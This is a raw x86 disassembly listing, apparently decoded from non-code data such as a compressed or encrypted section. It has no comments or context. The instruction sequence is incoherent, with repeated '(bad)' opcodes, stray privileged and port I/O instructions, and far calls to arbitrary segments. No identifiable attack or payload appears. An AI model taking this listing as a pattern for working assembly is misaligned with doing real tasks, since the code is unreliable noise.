  413365:	sbb    edi,edi
  413367:	xor    DWORD PTR [eax-0x75500e3f],eax
  41336d:	loop   0x413391
  41336f:	push   ebp
  413370:	rol    edi,1
  413372:	dec    eax
  413373:	or     BYTE PTR [ebp-0x44],bl
  413376:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413377:	test   eax,edx
  413379:	pop    ss
  41337a:	aad    0x77
  41337c:	in     al,0x16
  41337e:	idiv   BYTE PTR [ecx+0x5fe37f01]
  413384:	add    DWORD PTR [ecx+eax*8],esi
  413387:	mov    edx,DWORD PTR [esi+0x748b9044]
  41338d:	or     eax,0xeafe408
  413392:	call   0x566:0x472ea46e
  413399:	cmp    eax,DWORD PTR [ecx+ebp*8-0x3591907]
  4133a0:	pop    edi
  4133a1:	cmp    bl,BYTE PTR [edx-0x3c]
  4133a4:	sbb    eax,0x6529604
  4133a9:	dec    ecx
  4133aa:	pop    edx
  4133ab:	cli    
  4133ac:	mov    BYTE PTR [eax-0x9],ch
  4133af:	push   0x21
  4133b1:	sbb    ch,BYTE PTR [esi-0x57]
  4133b4:	sbb    bh,al
  4133b6:	jns    0x413401
  4133b8:	mov    dl,0xc0
  4133ba:	jle    0x41334b
  4133bc:	lea    esp,[edi+0x44d7e4cc]
  4133c2:	adc    al,0x50
  4133c4:	and    al,0xbf
  4133c6:	adc    bh,ch
  4133c8:	bound  esp,QWORD PTR [esi]
  4133ca:	cmp    esi,DWORD PTR [esi+0xe139fdb]
  4133d0:	add    DWORD PTR [esi+0x690dfb3],ecx
  4133d6:	int3   
  4133d7:	pavgw  mm4,QWORD PTR [eax]
  4133da:	and    eax,0x9e76e87c
  4133df:	pop    ecx
  4133e0:	sub    al,0x3f
  4133e2:	mov    bl,0x10
  4133e4:	sub    BYTE PTR [esi-0x14e71049],dh
  4133ea:	mov    esp,0x55e3c3d5
  4133ef:	mov    ds:0x4a2b02dd,eax
  4133f4:	mov    al,0x21
  4133f6:	jne    0x41343d
  4133f8:	retf   
  4133f9:	inc    ebx
  4133fa:	sub    BYTE PTR [edi+0x75bc7a6b],al
  413400:	cmp    ch,BYTE PTR ds:0xec4febde
  413406:	cld    
  413407:	shl    WORD PTR [edx+eiz*2-0x4e],1
  41340c:	xchg   ebp,eax
  41340d:	aas    
  41340e:	xchg   ebp,eax
  41340f:	fucomi st,st(7)
  413411:	ja     0x413468
  413413:	mov    eax,edx
  413415:	stc    
  413416:	fwait
  413417:	loope  0x4133b1
  413419:	cmc    
  41341a:	ret    0x5a74
  41341d:	mov    ebp,0x25009d80
  413422:	mov    ebp,DWORD PTR [ebp+0x53dffddd]
  413428:	int    0xae
  41342a:	pusha  
  41342b:	xchg   DWORD PTR ds:0xd1ae8f4d,ebx
  413431:	repnz or ebp,esi
  413434:	js     0x41340e
  413436:	outs   dx,BYTE PTR ds:[esi]
  413437:	ds pop esi
  413439:	sbb    ecx,DWORD PTR [edx+0x12821375]
  41343f:	out    dx,al
  413440:	jne    0x413481
  413442:	mov    bh,0x82
  413444:	repz pop edi
  413446:	jae    0x41340d
  413448:	clc    
  413449:	and    ebx,0xffffffd1
  41344c:	inc    esp
  41344d:	aas    
  41344e:	repz push 0xcbb99504
  413454:	sbb    ebx,esi
  413456:	sub    DWORD PTR [ecx+0x2c7d3ec4],edx
  41345c:	and    DWORD PTR [esi+0x42],ecx
  41345f:	fisub  WORD PTR ds:[edx]
  413462:	or     BYTE PTR [ecx+0x53a43df2],0x97
  413469:	sbb    esi,edx
  41346b:	out    dx,al
  41346c:	adc    al,0x38
  41346e:	pop    es
  41346f:	xchg   DWORD PTR [ebx],edx
  413471:	fisttp DWORD PTR [eax*8-0x613a91d1]
  413478:	fmul   QWORD PTR [ecx-0x40]
  41347b:	add    eax,DWORD PTR [edx-0xa]
  41347e:	gs loop 0x413450
  413481:	mov    eax,ds:0x62e67af5
  413486:	or     edx,DWORD PTR [edx-0x80]
  413489:	aad    0x58
  41348b:	in     eax,0xf0
  41348d:	pop    esp
  41348e:	hlt    
  41348f:	(bad)  
  413490:	pushf  
  413491:	add    DWORD PTR [edi+0x222992a2],ebx
  413497:	(bad)  
  413498:	loop   0x413449
  41349a:	in     eax,0xbd
  41349c:	in     al,dx
  41349d:	iret   
  41349e:	add    eax,0x85fd8b1
  4134a3:	(bad)  
  4134a4:	(bad)  
  4134a5:	mov    dl,0x20
  4134a7:	test   BYTE PTR [eax-0x6a4b9fa4],bh
  4134ad:	lods   al,BYTE PTR ds:[esi]
  4134ae:	mov    al,BYTE PTR [eax]
  4134b0:	sbb    ch,BYTE PTR [ebx]
  4134b2:	imul   ecx,DWORD PTR [eax],0x58
  4134b5:	push   ecx
  4134b6:	add    ch,BYTE PTR [esi+ecx*1]
  4134b9:	into   
  4134ba:	into   
  4134bb:	push   0x6b182f42
  4134c0:	add    DWORD PTR [ebp+0x47dfed64],esi
  4134c6:	enter  0xddb0,0xfe
  4134ca:	mov    al,BYTE PTR [ecx+ebx*4-0x59ba6160]
  4134d1:	fcom   st(3)
  4134d3:	or     edi,DWORD PTR [edx+0xe5a0bbc]
  4134d9:	cmp    dl,BYTE PTR ds:0x82b61c16
  4134df:	jmp    0x3449:0x16477f2b
  4134e6:	push   esi
  4134e7:	ja     0x4134a2
  4134e9:	mov    ch,ah
  4134eb:	imul   esp,DWORD PTR [ebp-0x7c],0xffffffa4
  4134ef:	xor    BYTE PTR [esi],bl
  4134f1:	jnp    0x4134bf
  4134f3:	in     eax,dx
  4134f4:	clc    
  4134f5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4134f6:	push   edi
  4134f7:	aad    0x4
  4134f9:	xor    BYTE PTR [ecx+0x4a],bl
  4134fc:	pop    eax
  4134fd:	repz les edx,FWORD PTR [ebp+0x398a955e]
  413504:	clc    
  413505:	push   ecx
  413506:	push   edx
  413507:	inc    ecx
  413508:	arpl   WORD PTR fs:[ecx-0x53],si
  41350c:	and    BYTE PTR [ecx-0x2a],bh
  41350f:	dec    esp
  413510:	mov    bh,0x12
  413512:	xor    eax,0xe30c6e52
  413517:	(bad)  
  413518:	dec    ebp
  413519:	call   0x38ff:0xf4565414
  413520:	in     eax,0x8e
  413522:	and    eax,DWORD PTR [ebx+0x7b]
  413525:	cmp    cl,BYTE PTR [ebx+ebx*4-0x3e2f91c0]
  41352c:	jecxz  0x4134d3
  41352e:	fbstp  TBYTE PTR ds:0xb506add7
  413534:	retf   0x2c08
  413537:	mov    dl,al
  413539:	dec    ecx
  41353a:	cmp    al,0xf
  41353c:	xchg   edi,eax
  41353d:	out    0xce,al
  41353f:	mov    dh,0x2d
  413541:	out    0x15,eax
  413543:	retf   
  413544:	jnp    0x413532
  413546:	inc    esi
  413547:	pop    es
  413548:	stos   DWORD PTR es:[edi],eax
  413549:	xor    al,0xa6
  41354b:	push   ebp
  41354c:	lea    esp,[ecx+esi*4]
  41354f:	mov    eax,ebp
  413551:	icebp  
  413552:	xchg   edi,eax
  413553:	in     al,0x6c
  413555:	cmp    DWORD PTR [eax-0x5d],0xffffffba
  413559:	mov    ecx,0x5280733d
  41355e:	add    eax,0xa058ea2d
  413563:	mov    DWORD PTR [eax-0x2a],esi
  413566:	cwde   
  413567:	sahf   
  413568:	sbb    DWORD PTR [ebp-0x52d5352a],ebx
  41356e:	mov    ebp,0xa4e2536e
  413573:	call   0x24f2:0x2d2bba6a
  41357a:	enter  0xdfc1,0x2b
  41357e:	int3   
  41357f:	push   esp
  413580:	dec    edx
  413581:	mov    ds:0xe1de4384,eax
  413586:	xchg   esp,eax
  413587:	jno    0x4135e1
  413589:	repnz popf 
  41358b:	gs pop edx
  41358d:	and    eax,0xa4df9589
  413592:	adc    BYTE PTR [esi+0x5c37ef9f],0xd5
  413599:	xor    ah,0xb1
  41359c:	imul   edi,DWORD PTR [esi+ecx*2],0x4a13581f
  4135a3:	dec    ebp
  4135a4:	pop    ecx
  4135a5:	sbb    eax,0x6b0884ad
  4135aa:	xor    ah,ah
  4135ac:	push   edx
  4135ad:	sub    ebp,DWORD PTR [esi+0x56ebfdb4]
  4135b3:	inc    ecx
  4135b4:	jo     0x41358b
  4135b6:	inc    ebp
  4135b7:	mov    esi,0x1ede8836
  4135bc:	int3   
  4135bd:	into   
  4135be:	cmc    
  4135bf:	fs and ah,dh
  4135c2:	xchg   edx,eax
  4135c3:	or     ah,BYTE PTR [edx-0x5f6808a6]
  4135c9:	pop    ss
  4135ca:	or     BYTE PTR [eax],ah
  4135cc:	cmp    esi,DWORD PTR [esi]
  4135ce:	sbb    edx,esp
  4135d0:	jnp    0x41359f
  4135d2:	enter  0x9ee1,0xfd
  4135d6:	pop    eax
  4135d7:	or     edi,DWORD PTR [edx-0x29]
  4135da:	pop    edi
  4135db:	xchg   ecx,eax
  4135dc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4135dd:	(bad)  
  4135de:	mov    ebp,0x21d45b4e
  4135e3:	pop    esp
  4135e4:	test   al,0xa1
  4135e6:	or     ebx,DWORD PTR [esi+0x34d84cef]
  4135ec:	jne    0x4135fe
  4135ee:	inc    ecx
  4135ef:	data16 clc 
  4135f1:	repnz mov WORD PTR [esi-0x407a2207],ss
  4135f8:	scas   eax,DWORD PTR es:[edi]
  4135f9:	mov    al,0x9
  4135fb:	arpl   WORD PTR [ebx-0x25],bp
  4135fe:	or     al,BYTE PTR [esi+0x37]
  413601:	mov    ?,eax
  413603:	and    eax,0x2ff40d3a
  413608:	inc    ebp
  413609:	mov    fs,WORD PTR [esi-0x774965a1]
  41360f:	jne    0x4135db
  413611:	sub    BYTE PTR [ecx],ch
  413613:	ins    BYTE PTR es:[edi],dx
  413614:	sub    esp,DWORD PTR [eax+0x98ee446]
  41361a:	xor    eax,0x180546d4
  41361f:	adc    al,0x2a
  413621:	shr    eax,1
  413623:	xor    bh,BYTE PTR [ebx-0x4275dd07]
  413629:	rcr    DWORD PTR [edx-0xa],1
  41362c:	(bad)  
  41362d:	sbb    al,BYTE PTR [ecx+0x14c26ef8]
  413633:	ret    
  413634:	out    0x38,al
  413636:	stos   DWORD PTR es:[edi],eax
  413637:	xchg   esi,eax
  413638:	jns    0x41368d
  41363a:	das    
  41363b:	mov    ds,WORD PTR [eax-0x279e03f]
  413641:	and    BYTE PTR [ebp-0x7a],ch
  413644:	pop    esi
  413645:	pop    ebp
  413646:	out    dx,eax
  413647:	cmp    cl,ah
  413649:	outs   dx,BYTE PTR ds:[esi]
  41364a:	mov    BYTE PTR [eax-0x2d],ch
  41364d:	mov    cl,0x86
  41364f:	pop    DWORD PTR [ebx+ecx*1-0x21]
  413653:	lods   al,BYTE PTR ds:[esi]
  413654:	data16 aas 
  413656:	(bad)  
  413657:	adc    edi,DWORD PTR [esi+ecx*2-0x5c]
  41365b:	arpl   di,cx
  41365d:	fidiv  WORD PTR [eax-0x58392930]
  413663:	(bad)  
  413664:	repnz imul ebx,DWORD PTR [esi],0xfffffffe
  413668:	sbb    DWORD PTR [ebp-0x74],esi
  41366b:	and    ebx,0x42
  41366e:	push   edi
  41366f:	inc    eax
  413670:	outs   dx,DWORD PTR ds:[esi]
  413671:	mov    ah,0xed
  413673:	loopne 0x4136f1
  413675:	loop   0x413676
  413677:	shr    DWORD PTR [ebp+0x1ad7c548],cl
  41367d:	pop    ebx
  41367e:	or     DWORD PTR [edi+0x4ced9802],ecx
  413684:	shl    BYTE PTR [esi],1
  413686:	arpl   WORD PTR [ebx],bp
  413688:	int3   
  413689:	pop    eax
  41368a:	test   BYTE PTR [ebx+0x7d],ah
  41368d:	xlat   BYTE PTR ds:[ebx]
  41368e:	enter  0xd63f,0xa2
  413692:	fwait
  413693:	jne    0x4136e7
  413695:	pop    edi
  413696:	xchg   esp,eax
  413697:	xchg   edx,eax
  413698:	mov    ds:0xa1431852,eax
  41369d:	inc    esi
  41369f:	jle    0x413666
  4136a1:	xchg   esp,esp
  4136a3:	outs   dx,DWORD PTR ds:[esi]
  4136a4:	icebp  
  4136a5:	jp     0x4136db
  4136a7:	mov    eax,ds:0x9e60d44a
  4136ac:	pop    edi
  4136ad:	mov    al,ds:0xbd7092e5
  4136b2:	(bad)  
  4136b3:	inc    ecx
  4136b4:	loope  0x4136da
  4136b6:	push   edi
  4136b7:	(bad)  
  4136b8:	cmp    eax,0x147bf34b
  4136bd:	mov    cs,WORD PTR [eax+0x22]
  4136c0:	xchg   edx,eax
  4136c1:	dec    esp
  4136c2:	enter  0xf384,0xaa
  4136c6:	enter  0x55ed,0x46
  4136ca:	in     al,dx
  4136cb:	ret    
  4136cc:	inc    ecx
  4136cd:	cmp    DWORD PTR [edi+0x1fe11945],ebp
  4136d3:	adc    DWORD PTR [edx+eiz*1],esp
  4136d6:	idiv   DWORD PTR [ebp+0x60ca9bc6]
  4136dc:	push   0x70
  4136de:	inc    eax
  4136df:	dec    edi
  4136e0:	add    ebx,DWORD PTR [ebp+0x55d3ac56]
  4136e6:	mov    eax,0xd5beaece
  4136eb:	(bad)  
  4136ec:	mov    edx,0x4fbe7626
  4136f1:	ss aas 
  4136f3:	push   ebp
  4136f4:	xchg   ebx,eax
  4136f5:	push   es
  4136f6:	mov    ds:0x8ceaf22f,eax
  4136fb:	jl     0x4136aa
  4136fd:	xchg   BYTE PTR [ebx+ebx*1-0xd],ch
  413701:	test   BYTE PTR [ecx],0xb2
  413704:	loop   0x413735
  413706:	(bad)  [ebx+eiz*8-0x60]
  41370a:	(bad)
  41370d:	pop    ebx
  41370e:	shr    edi,cl
  413710:	scas   eax,DWORD PTR es:[edi]
  413711:	push   0xc9033cd5
  413716:	sbb    ch,BYTE PTR [ecx-0x3a]
  413719:	adc    ah,BYTE PTR [esi+0x5a]
  41371c:	and    BYTE PTR [ebx-0x3eeccd60],0xe4
  413723:	dec    edi
  413724:	cmp    al,0xb0
  413726:	and    DWORD PTR [eax],esp
  413728:	fimul  WORD PTR [ebp-0x75]
  41372b:	sbb    al,0xbd
  41372d:	imul   esi,DWORD PTR ss:[ecx+0x436b7d14],0xffffffa6
  413735:	mov    edx,0x4fd5d266
  41373a:	dec    eax
  41373b:	rol    BYTE PTR [edi],0x8
  41373e:	outs   dx,BYTE PTR es:[esi]
  413740:	cmp    BYTE PTR [edi+0x2b],dh
  413743:	call   0xc5aa:0x5c80b65
  41374a:	fwait
  41374b:	loope  0x4136ea
  41374d:	aas    
  41374e:	jp     0x413736
  413750:	imul   edx,DWORD PTR [esi],0x73
  413753:	sub    edx,DWORD PTR [ecx+esi*4-0x6e]
  413757:	js     0x41377f
  413759:	lods   eax,DWORD PTR ds:[esi]
  41375a:	dec    edx
  41375b:	mov    ch,0x67
  41375d:	(bad)
  413760:	fnstenv [ebp-0x66]
  413763:	add    BYTE PTR [edx],bl
  413765:	dec    bx
  413767:	push   eax
  413768:	cmc    
  413769:	jl     0x4137ce
  41376b:	xchg   ecx,eax
  41376c:	sub    BYTE PTR [ebx],ah
  41376e:	out    0xed,al
  413770:	dec    esp
  413771:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413772:	ret    
  413773:	or     ebp,DWORD PTR [ecx+0x296ac943]
  413779:	pop    edx
  41377a:	add    al,0xe4
  41377c:	(bad)  
  41377d:	mov    ds:0x3d9d7403,al
  413782:	rol    DWORD PTR [ebx-0xf6ec5b6],1
  413788:	cwde   
  413789:	mov    ds:0x4e4a2d11,al
  41378e:	sub    ax,bp
  413791:	and    al,0x40
  413793:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413794:	rcr    DWORD PTR [eax+0x44],1
  413797:	xchg   edx,eax
  413798:	adc    DWORD PTR ds:0x58ba2cbf,edx
  41379e:	aaa    
  41379f:	mov    ss,WORD PTR [ebx+0x7b90caec]
  4137a5:	pop    ebx
  4137a6:	pop    ebp
  4137a7:	dec    ecx
  4137a8:	mov    ebp,0xe0088511
  4137ad:	sub    ebx,DWORD PTR [ecx+0x64123494]
  4137b3:	push   esi
  4137b4:	inc    ecx
  4137b5:	inc    eax
  4137b6:	inc    edx
  4137b7:	cmp    cl,dl
  4137b9:	jne    0x413779
  4137bb:	add    BYTE PTR [eax+0x160639ac],bl
  4137c1:	push   ds
  4137c2:	jbe    0x4137c6
  4137c4:	into   
  4137c5:	sub    BYTE PTR [ecx],dl
  4137c7:	xchg   dx,ax
  4137c9:	cmp    dh,BYTE PTR [ecx+0x1c255681]
  4137cf:	inc    eax
  4137d0:	mov    al,ds:0x27755afb
  4137d5:	shl    DWORD PTR [ecx-0x421b9384],1
  4137db:	out    0x74,al
  4137dd:	lods   eax,DWORD PTR ds:[esi]
  4137de:	dec    ebp
  4137df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4137e0:	call   0xddb86039
  4137e5:	mov    cl,0x49
  4137e7:	lea    ecx,[esi-0x312b451e]
  4137ed:	(bad)
  4137f1:	jne    0x41384e
  4137f3:	lds    edi,FWORD PTR [ebp-0x62aa0006]
  4137f9:	jecxz  0x41385c
  4137fb:	aaa    
  4137fc:	(bad)  
  4137fd:	lock repz iret 
  413800:	sbb    ah,dl
  413802:	shl    ebx,0x41
  413805:	xor    DWORD PTR [ecx+0x71],esp
  413808:	jns    0x413884
  41380a:	int    0xc5
  41380c:	add    al,0x88
  41380e:	jecxz  0x4137d3
  413810:	mov    bh,0x9c
  413812:	mov    dh,BYTE PTR [esi+0x55e5423b]
  413818:	mov    dh,0x26
  41381a:	adc    DWORD PTR [eax-0x48efa74d],ecx
  413820:	neg    BYTE PTR [eax+ebp*1]
  413823:	and    BYTE PTR [ecx],0x69
  413826:	jae    0x413806
  413828:	pop    eax
  413829:	jb     0x413860
  41382b:	push   edi
  41382c:	in     eax,dx
  41382d:	pop    ecx
  41382e:	pop    ecx
  41382f:	or     BYTE PTR [esi],cl
  413831:	aad    0xe8
  413833:	and    al,0xea
  413835:	iret   
  413836:	jne    0x4137f9
  413838:	aaa    
  413839:	sub    DWORD PTR [ecx+ecx*2],ecx
  41383c:	shl    BYTE PTR [esi],1
  41383e:	push   es
  41383f:	(bad)  
  413840:	out    dx,al
  413841:	push   esp
  413842:	imul   eax,DWORD PTR [edx],0xffffff89
  413845:	inc    esp
  413846:	xchg   esp,edi
  413848:	mov    al,0x10
  41384a:	addr16 sbb al,0x16
  41384d:	in     al,0x78
  41384f:	dec    ecx
  413850:	adc    al,0x26
  413852:	mov    ds:0x38c25c28,al
  413857:	push   eax
  413858:	mov    ds:0x34cc187a,al
  41385d:	sahf   
  41385e:	inc    esi
  41385f:	pop    eax
  413860:	daa    
  413861:	rcl    ebx,1
  413863:	fldenv [edi-0x4cb5c6f9]
  413869:	mov    ebx,DWORD PTR [edi]
  41386b:	mov    bl,0xc4
  41386d:	(bad)
  413870:	dec    ecx
  413871:	popf   
  413872:	xor    eax,0xad549f28
  413877:	in     al,dx
  413878:	xor    BYTE PTR [eax-0x6dd0f693],cl
  41387e:	and    ebx,DWORD PTR [ebx+eiz*2+0x3f]
  413882:	in     eax,0x95
  413884:	jmp    0x55ce24d2
  413889:	mov    al,BYTE PTR [edi-0x3d]
  41388c:	cdq    
  41388d:	out    0x4f,eax
  41388f:	ins    BYTE PTR es:[edi],dx
  413890:	jle    0x41381a
  413892:	lods   al,BYTE PTR ds:[esi]
  413893:	mov    bl,bh
  413895:	(bad)  
  413896:	add    al,0x1f
  413898:	es pusha 
  41389a:	leave  
  41389b:	rcl    BYTE PTR [eax-0x353aff67],1
  4138a1:	cli    
  4138a2:	pop    ecx
  4138a3:	inc    esi
  4138a4:	fldcw  WORD PTR [ebx]
  4138a6:	add    ah,BYTE PTR [ebp-0x104ce37]
  4138ac:	inc    esp
  4138ad:	outs   dx,DWORD PTR ds:[esi]
  4138ae:	mov    eax,0x3f11f25e
  4138b3:	cmp    ch,BYTE PTR [ebp-0x21]
  4138b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4138b7:	adc    esi,DWORD PTR [edi]
  4138b9:	fistp  QWORD PTR [ebp+0x4b]
  4138bc:	jl     0x41385e
  4138be:	xor    cl,ah
  4138c0:	pop    esp
  4138c1:	cli    
  4138c2:	push   ebx
  4138c3:	ss or  ebx,ebp
  4138c6:	and    DWORD PTR [edx+0x7a0d4d41],edi
  4138cc:	cmc    
  4138cd:	mov    ah,0xa9
  4138cf:	adc    eax,0x4989315e
  4138d4:	loop   0x4138c5
  4138d6:	adc    DWORD PTR ds:0x94e01437,esi
  4138dc:	cli    
  4138dd:	sbb    DWORD PTR [eax+0x4b8254ce],ebx
  4138e3:	pushf  
  4138e4:	mov    ch,0x55
  4138e6:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  4138e8:	sti    
  4138e9:	sbb    BYTE PTR [edi+0x45d7e5b9],bh
  4138ef:	cmp    BYTE PTR [edx+edx*8],0xea
  4138f3:	sbb    DWORD PTR [eax],ebp
  4138f5:	popf   
  4138f6:	adc    al,0x67
  4138f8:	sbb    DWORD PTR [ebx],edi
  4138fa:	shl    BYTE PTR [eax],1
  4138fc:	gs popaw 
  4138ff:	rol    DWORD PTR ss:0x44c723c3,0xd7
  413907:	into   
  413908:	out    0xd0,eax
  41390a:	bound  eax,QWORD PTR cs:[edi]
  41390d:	fdiv   QWORD PTR [ebx]
  41390f:	fistp  QWORD PTR [eax+0x36]
  413912:	add    BYTE PTR [edi],bl
  413914:	daa    
  413915:	pop    ecx
  413916:	icebp  
  413917:	or     ah,bl
  413919:	nop
  41391a:	fnsave [ebp-0x7f]
  41391d:	sti    
  41391e:	scas   eax,DWORD PTR es:[edi]
  41391f:	scas   eax,DWORD PTR es:[edi]
  413920:	in     al,dx
  413921:	push   ebx
  413922:	and    DWORD PTR [edi-0x11],esi
  413925:	lods   eax,DWORD PTR ds:[esi]
  413926:	adc    esp,DWORD PTR [esi-0x32]
  413929:	into   
  41392a:	mov    ebx,0x85e614b2
  41392f:	pop    edx
  413930:	fnclex 
  413932:	leave  
  413933:	repz loop 0x4138f3
  413936:	test   al,0xb8
  413938:	retf   0xef46
  41393b:	pop    es
  41393c:	pop    eax
  41393d:	xchg   ebx,eax
  41393e:	adc    eax,0x723b5c32
  413943:	les    ebp,FWORD PTR [ecx]
  413945:	add    eax,0x3155594a
  41394a:	or     al,0x9e
  41394c:	jmp    0x413995
  41394e:	sti    
  41394f:	call   FWORD PTR [ecx]
  413951:	nop
  413952:	(bad)  
  413953:	pop    ds
  413954:	xchg   BYTE PTR [ebx+ecx*1-0x1946fcd5],dl
  41395b:	pop    ebx
  41395c:	jne    0x4139c6
  41395e:	add    DWORD PTR [edx+0x4e],ebp
  413961:	xor    eax,0x27f9a634
  413966:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413967:	sub    ebx,esi
  413969:	mov    WORD PTR [ebx+0x3e],?
  41396c:	cli    
  41396d:	test   BYTE PTR [ebx+0x13f0442b],0x4d
  413974:	xchg   esp,eax
  413975:	retf   
  413976:	pop    ebp
  413977:	jno    0x413907
  413979:	test   al,dl
  41397b:	xor    ch,BYTE PTR [ebx+eax*4-0x1b]
  41397f:	sbb    cl,ah
  413981:	fisubr WORD PTR [edx+0x1ba2f3b3]
  413987:	imul   esi,DWORD PTR cs:0x168851ff,0x28fddcec
  413992:	ds lahf 
  413994:	lahf   
  413995:	sbb    dl,bl
  413997:	jp     0x41399e
  413999:	arpl   WORD PTR [ecx+0x62bbf501],bp
  41399f:	jmp    0x413a16
  4139a1:	scas   al,BYTE PTR es:[edi]
  4139a2:	test   BYTE PTR [edi+eax*8+0x73],ah
  4139a6:	add    edx,DWORD PTR [edx]
  4139a8:	sbb    DWORD PTR [ebx+0x70],ecx
  4139ab:	popf   
  4139ac:	cmp    BYTE PTR [edi+eax*4+0x2817a87a],ah
  4139b3:	pop    esp
  4139b4:	xchg   edx,eax
  4139b5:	outs   dx,BYTE PTR ds:[esi]
  4139b6:	push   edi
  4139b7:	jle    0x41396b
  4139b9:	call   0x8a65:0xd9bebde5
  4139c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4139c1:	inc    edx
  4139c2:	ret    0x31aa
  4139c5:	cmp    BYTE PTR [edi+0x6a815983],ah
  4139cb:	gs out dx,al
  4139cd:	adc    DWORD PTR ds:0x4b9f888e,0xfffffff5
  4139d4:	inc    ebx
  4139d5:	popf   
  4139d6:	mov    dl,BYTE PTR [esi]
  4139d8:	fild   QWORD PTR [ebp+0x76]
  4139db:	fisttp WORD PTR [esp+ebp*2]
  4139de:	imul   DWORD PTR [eax]
  4139e0:	sbb    esp,DWORD PTR [edi+esi*1]
  4139e3:	adc    BYTE PTR [ebx+edx*8-0xd],bh
  4139e7:	je     0x413a45
  4139e9:	push   edx
  4139ea:	and    al,0x71
  4139ec:	mov    bl,0xc4
  4139ee:	js     0x413a2c
  4139f0:	pop    ebp
  4139f1:	and    BYTE PTR [eax+0x3a03e67f],bh
  4139f7:	or     BYTE PTR [edi+0x786eb7e1],ah
  4139fd:	pop    edi
  4139fe:	sbb    al,0xed
  413a00:	cdq    
  413a01:	sub    edx,DWORD PTR [edi]
  413a03:	lds    ebp,FWORD PTR [edi-0x61]
  413a06:	mov    BYTE PTR [esi+ebp*4],dh
  413a09:	je     0x4139bd
  413a0b:	cwde   
  413a0c:	or     edi,esp
  413a0e:	or     al,BYTE PTR [eax]
  413a10:	and    eax,0x84f30550
  413a15:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413a16:	and    al,0x36
  413a18:	mov    dl,BYTE PTR [ebx-0x34907795]
  413a1e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413a1f:	repnz mov eax,0x6c0f7daf
  413a25:	jp     0x413a6f
  413a27:	popf   
  413a28:	ret    
  413a29:	xor    al,BYTE PTR [esi]
  413a2b:	push   ebp
  413a2c:	sbb    DWORD PTR [ebx],ebx
  413a2e:	push   ecx
  413a2f:	push   edx
  413a30:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413a31:	jo     0x4139f2
  413a33:	sub    ebx,ebx
  413a35:	mov    DWORD PTR [ecx+0x58],0xf7b02016
  413a3c:	dec    ecx
  413a3d:	out    dx,eax
  413a3e:	es loope 0x4139cf
  413a41:	(bad)  
  413a42:	sub    al,0x33
  413a44:	in     eax,0x8e
  413a46:	leave  
  413a47:	loop   0x4139e3
  413a49:	fcmovnb st,st(3)
  413a4b:	mov    al,0xeb
  413a4d:	jge    0x413a33
  413a4f:	mov    edi,0x58e8a373
  413a54:	imul   esp,DWORD PTR [edx-0x1e],0x8a079080
  413a5b:	mov    esp,0xaf9e213e
  413a60:	inc    ebp
  413a61:	inc    ebx
  413a62:	mov    esp,0x7f338b6c
  413a67:	inc    esp
  413a68:	lods   eax,DWORD PTR ds:[esi]
  413a69:	jns    0x413a60
  413a6b:	stos   DWORD PTR es:[edi],eax
  413a6c:	mov    ?,WORD PTR [edx]
  413a6e:	fbld   TBYTE PTR [eax]
  413a70:	test   edi,ecx
  413a72:	jp     0x413a5e
  413a74:	in     eax,dx
  413a75:	stc    
  413a76:	cs sahf 
  413a78:	ret    0xf2fe
  413a7b:	outs   dx,DWORD PTR ds:[esi]
  413a7c:	in     eax,dx
  413a7d:	push   ecx
  413a7e:	cmp    ch,BYTE PTR [edi-0x65aeef2e]
  413a84:	mov    cs,WORD PTR [edx-0x5b]
  413a87:	stc    
  413a88:	ret    
  413a89:	lods   eax,DWORD PTR ds:[esi]
  413a8a:	dec    ebx
  413a8b:	jno    0x413a93
  413a8d:	mov    DWORD PTR [ecx-0x26f6b4ff],ebp
  413a93:	in     eax,dx
  413a94:	add    esp,DWORD PTR [esi+0x44]
  413a97:	pop    edi
  413a98:	pop    es
  413a99:	inc    ecx
  413a9a:	xchg   ebx,eax
  413a9b:	ror    BYTE PTR ds:0x2e9f7ea8,0xeb
  413aa2:	xor    al,0xd5
  413aa4:	sbb    al,0x27
  413aa6:	scas   eax,DWORD PTR es:[edi]
  413aa7:	xor    ebx,0x61
  413aaa:	out    dx,al
  413aab:	mov    eax,ds:0xbfe871c6
  413ab0:	and    eax,0xfa81eb7b
  413ab5:	inc    eax
  413ab6:	std    
  413ab7:	mov    esp,0x325783ac
  413abc:	inc    eax
  413abd:	sti    
  413abe:	mov    ds:0xe3bde21c,al
  413ac3:	daa    
  413ac4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413ac5:	test   BYTE PTR [eax+eiz*4],bl
  413ac8:	imul   edi,eax,0x5
  413acb:	ror    BYTE PTR ds:0xf8160b93,1
  413ad1:	(bad)  
  413ad2:	into   
  413ad3:	pushf  
  413ad4:	inc    edx
  413ad5:	mov    bh,BYTE PTR [esi-0x587665e3]
  413adb:	xor    BYTE PTR [edi+ecx*8-0x551228d7],cl
  413ae2:	ret    0xf93e
  413ae5:	xlat   BYTE PTR ds:[ebx]
  413ae6:	xor    al,0x8
  413ae8:	push   ss
  413ae9:	and    eax,0xd2eff7fa
  413aee:	and    al,0xfd
  413af0:	mov    al,0xbe
  413af2:	gs pop ebp
  413af4:	aad    0x77
  413af6:	popf   
  413af7:	cmc    
  413af8:	dec    esp
  413af9:	ret    
  413afa:	int3   
  413afb:	stos   DWORD PTR es:[edi],eax
  413afc:	sbb    DWORD PTR [ebx+0x5c],ebx
  413aff:	inc    edx
  413b00:	inc    ecx
  413b01:	jo     0x413aff
  413b03:	test   BYTE PTR [ebx],ch
  413b05:	scas   eax,DWORD PTR es:[edi]
  413b06:	xchg   esp,eax
  413b07:	fs aas 
  413b09:	pop    es
  413b0a:	and    edi,DWORD PTR [esi]
  413b0c:	in     al,dx
  413b0d:	or     al,0x2a
  413b0f:	adc    eax,0xb3147a94
  413b14:	aam    0x33
  413b16:	push   ss
  413b17:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
